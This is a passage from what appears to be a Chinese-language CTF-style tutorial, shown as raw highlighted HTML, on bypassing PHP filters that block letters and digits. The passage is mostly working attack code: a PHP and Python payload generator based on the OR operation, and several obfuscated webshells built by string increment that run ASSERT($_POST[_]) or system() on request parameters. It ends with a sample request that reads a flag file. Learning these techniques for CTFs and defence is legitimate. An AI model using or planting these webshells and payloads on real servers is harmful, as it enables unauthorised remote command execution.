class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;    <span class="hljs-comment">// 根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>        <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>        <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>首先运行以上 PHP 脚本后，会生成一个 txt 文档or_rce.txt，里面包含所有可见字符的或运算构造结果。</p><p>接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[+] your function：system<br>[+] your command：ls /<br>(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13%00%00&quot;|&quot;%60%60%20%2f&quot;);<br></code></pre></td></tr></table></figure><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>，而在 C 中，<code>a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91）。</p><p>注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。</p><p><a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p><p>也就是说：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;A&quot;</span>++ ==&gt; <span class="hljs-string">&quot;B&quot;</span><br><span class="hljs-string">&quot;B&quot;</span>++ ==&gt; <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-string">&quot;Z&quot;</span>++ ==&gt; <span class="hljs-string">&quot;AA&quot;</span><br>...<br></code></pre></td></tr></table></figure><p>只要我们能拿到一个变量，其值为 <code>A</code>，那么通过自增操作即可获得 <code>A-Z</code> 中所有字符。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为 <code>Array</code>。而 <code>Array</code> 的第一个字母就是大写 A，而且第4个字母是小写 a。也就是说我们可以同时拿到小写 a 和大写 A，那么我们就可以拿到 <code>a-z</code> 和 <code>A-Z</code> 的所有字母：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&#x27;</span>.[];<br>Array<br>php &gt; <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;&#x27;</span>.[])&#123;<span class="hljs-number">0</span>&#125;;<br>A<br>php &gt; <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;&#x27;</span>.[])&#123;<span class="hljs-number">3</span>&#125;;<br>a<br>php &gt;  <br></code></pre></td></tr></table></figure><h4 id="Webshell-php5"><a href="#Webshell-php5" class="headerlink" title="Webshell(php5):"></a>Webshell(php5):</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// E </span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// R</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// P</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// O</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-comment">// ASSERT($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>简化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure><h4 id="Webshell-通用"><a href="#Webshell-通用" class="headerlink" title="Webshell(通用):"></a>Webshell(通用):</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=++<span class="hljs-variable">$___</span>;--<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;<span class="hljs-variable">$______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;<span class="hljs-variable">$_______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$________</span>=<span class="hljs-variable">$______</span>;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>=(<span class="hljs-variable">$________</span>&#123;++<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$____________</span>=<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$______</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$_______</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_________</span>;<span class="hljs-variable">$__________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$___________</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__________</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$___________</span>=<span class="hljs-variable">$$___________</span>;<span class="hljs-variable">$____________</span>(<span class="hljs-variable">$___________</span>&#123;<span class="hljs-variable">$_______</span>&#125;);<br><br><span class="hljs-comment">//SYSTEM($_GET&#123;T&#125;)</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;;&#x27;</span>];<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-comment">//E</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-comment">//G</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-comment">//T</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__</span>.<span class="hljs-variable">$_</span>;<br>(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;_&#x27;</span>])(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;__&#x27;</span>]);<br><br><span class="hljs-comment">//($_GET[&#x27;_&#x27;])($_GET[&#x27;__&#x27;])</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?_=system&amp;__=cat /f1agaaa<br>code=<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;;&#x27;</span>];<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span 